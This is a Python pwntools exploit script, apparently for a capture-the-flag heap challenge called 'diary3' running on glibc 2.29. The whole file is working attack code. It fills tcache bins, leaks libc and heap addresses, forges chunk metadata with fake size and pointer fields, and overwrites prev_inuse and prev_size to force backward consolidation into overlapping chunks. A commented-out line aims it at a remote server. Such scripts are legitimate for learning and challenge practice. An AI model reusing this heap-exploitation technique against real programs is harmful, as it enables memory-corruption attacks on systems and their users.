
from pwn import *
C = 3
p = process("./diary3",env={"LD_PRELOAD":"libc-2.29.so"})
#p = remote("206.189.18.188",31615)#"206.189.18.188",30019)
#context.log_level = "debug"
e = ELF("./diary3")
#libc = ELF("./libc-2.23.so")
#context.log_level = "debug"
allocations = 18
def step(string):
    if C == 3:
        wait = input(string)
    else:
        wait = raw_input(string)
        
def alloc(size, data):
	p.recvrepeat(.1)
	p.sendline(str(1))
	p.recvrepeat(.1)
	p.sendline(str(size))
	p.recvrepeat(.1)
	p.sendline(data)#.replace('\x7f', '\x16\x7f'))

def edit(index, data):
	p.recvrepeat(.1)
	p.sendline(str(2))
	p.recvrepeat(.1)
	p.sendline(str(index))
	p.recvrepeat(.1)
	p.sendline(data)#.replace('\x7f', '\x16\x7f'))

def free(index):
	p.recvrepeat(.1)
	p.sendline(str(3))
	p.recvrepeat(.1)
	p.sendline(str(index))

def dump(index):
    p.recvrepeat(.1)
    p.sendline(str(4))
    p.recvrepeat(.1)
    p.sendline(str(index))


step("Filling tcache[0x118]")
for x in range(10):
    alloc(0x118,str(x) * 0x118)
for x in range(7):
    free(3 + x)
#step("Filling tcache[0xf8]")
#for x in range(7):
#    alloc(0xf8,str(x) * 0xf8)
#for x in range(7):
#    free(3 + x)

free(0)
free(1)
alloc(0xf8,"")
#context.log_level = "debug"
dump(0)
leak = p.recvuntil("data: ")
leak = p.recv(6)+b'\x00\x00'
leak = u64(leak)
libc = leak - 0x3b3e0a
log.info("Leaked addr " + hex(leak))
log.info("Libc base " + hex(libc))

step("Cleanup")
free(0)
free(2)
step("Alloc 3 adjacent chunks")
alloc(0x118,"" )
alloc(0x118,"B")
alloc(0x118,"B")
step("Leak heap addr?")
dump(0)
leak = p.recvuntil("data: ")
leak =p.recv(6)+b'\x00\x00'
heap_leak = u64(leak)
heap_base = heap_leak - 0x1f0a
log.info("Heap leaked: " + hex(heap_leak))
log.info("Heap base: " + hex(heap_base))
step("Cleanup and refill tcache ")
free(0)
free(1)
free(2)
step("mallocing 10 0x118 chunks")
fd = heap_base + 0x1f50
alloc(0x118, b"A" * (0x118 - 0x20) + p64(0x141) + p64(fd) + p64(fd))
alloc(0x118,"B")
alloc(0x118,"C")
for x in range(7):
    alloc(0x118,str(x) + "A")
for x in range(7):
    free(3 + x)

step("Editing 2nd to overwrite 3rd prev_inuse")
edit(1, "B" * 0x118)

step("Mallocinging so when we free we get a tcache entry")
alloc(0x118,"Pog")
alloc(0x118,"pog2")
str("Freeing 2nd chunk and Allocating and setting prev_size")
free(1)

step("alloc")
alloc(0x118,b'B' * 0x110 + p64(0x140))

step("fill tcache")
free(4)
free(3)

step("Filling up tcache[0x100]")
for x in range(7):
    alloc(0xf8,"")
for x in range(7):
    free(3 + x)

step("Check tcache")

step("backwards consolidate, Freeing")
free(2)
step("Allocating")
alloc(0x140,"POGCHAMP HACK")
step("Check")

